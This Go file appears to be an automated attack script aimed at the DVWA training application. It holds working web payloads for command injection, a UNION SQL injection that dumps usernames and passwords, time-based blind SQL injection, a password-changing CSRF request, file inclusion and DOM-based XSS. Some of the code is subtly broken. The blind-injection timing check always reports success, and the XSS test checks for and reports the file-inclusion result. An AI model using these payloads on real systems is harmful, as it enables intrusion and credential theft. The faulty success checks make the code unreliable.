package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func cmdInject(site string, path string, client *http.Client) {
	defer wg.Done()

	final := site + path

	uid := time.Now().String() + "cmd-inject"

	resp, err := client.PostForm(final, url.Values{
		"ip":     {"; echo '" + uid + "'"},
		"Submit": {"Submit"},
	})
	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	data, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	if strings.Contains(string(data), uid) {
		fmt.Println("Command Inject Success")
	} else {
		fmt.Println("Command Inject Failed")

	}

}

func SQLInject(site string, path string, client *http.Client) {
	defer wg.Done()

	final := site + path

	uid := "' and 1=0 union select null, concat(user,':',password) from users as SQLINJECT #"

	resp, err := client.PostForm(final, url.Values{
		"id":     {uid},
		"Submit": {"Submit"},
	})
	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	data, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	if strings.Contains(string(data), uid) {
		fmt.Println("SQL Injection Success")
	} else {
		fmt.Println("SQL Injection Failed")

	}

}

func blindSQLInject(site string, path string, client *http.Client) {
	defer wg.Done()

	final := site + path + "?id=1"

	uid := url.QueryEscape("' and sleep(5) #") + "&Submit=Submit"

	start := time.Now()

	resp, err := client.Get(final + uid)
	if err != nil {
		log.Fatal(err)
	}

	elapsed := time.Since(start)

	defer resp.Body.Close()

	_, err = ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	if elapsed >= 5 {
		fmt.Println("Blind SQL Injection Success")
	} else {
		fmt.Println("Blind SQL Injection Failed")

	}

}

func javascript(site string, path string, client *http.Client) {
	defer wg.Done()

	final := site + path

	resp, err := client.PostForm(final, url.Values{
		"token":  {"38581812b435834ebf84ebcc2c6424d6"},
		"phrase": {"success"},
		"Submit": {"Submit"},
	})
	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	data, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	if strings.Contains(string(data), "Well done!") {
		fmt.Println("Javascript Success")
	} else {
		fmt.Println("Javascript Failed")

	}

}

func csrf(site string, path string, client *http.Client) {
	defer wg.Done()

	final := site + path + "?password_new=password&password_conf=password&Change=Change"

	resp, err := client.Get(final)
	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	data, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	if strings.Contains(string(data), "Password Changed.") {
		fmt.Println("CSRF Success")
	} else {
		fmt.Println("CSRF Failed")

	}

}

func lfi(site string, path string, client *http.Client) {
	defer wg.Done()

	final := site + path + "?page=file4.php"

	resp, err := client.Get(final)
	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	data, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	if strings.Contains(string(data), "This file isn't listed at all on DVWA. If you are reading this, you did something right ;-)") {
		fmt.Println("Remote File Inclusion Success")
	} else {
		fmt.Println("Remote File Inclusion Failed")

	}

}

func xss_dom(site string, path string, client *http.Client) {
	defer wg.Done()

	final := site + path + "?default=<script>window.open('https://www.google.com','_self')</script>"

	resp, err := client.Get(final)
	if err != nil {
		log.Fatal(err)
	}

	defer resp.Body.Close()

	data, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}

	fmt.Println(string(data))

	if strings.Contains(string(data), "This file isn't listed at all on DVWA. If you are reading this, you did something right ;-)") {
		fmt.Println("Remote File Inclusion Success")
	} else {
		fmt.Println("Remote File Inclusion Failed")

	}

}
